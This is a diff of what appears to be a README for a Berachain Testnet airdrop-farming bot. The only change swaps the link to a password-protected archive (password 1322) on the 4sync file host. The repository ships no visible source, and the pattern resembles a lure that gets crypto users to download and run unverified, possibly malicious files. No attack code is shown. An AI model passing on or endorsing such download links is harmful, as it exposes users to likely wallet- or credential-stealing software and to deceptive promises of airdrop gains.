@@ -4,7 +4,7 @@
 
 - A Node.js bot script to automate Berachain Testnet interactions and maximize airdrop eligibility.
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
 ## PASSWORD: 1322
 
 <img width="1079" height="550" alt="505634221-36929ba5-d349-4b8e-b100-09c9c66958cd" src="https://github.com/user-attachments/assets/bcfffd1a-e396-46f7-8487-15f7d9cb7cff" />
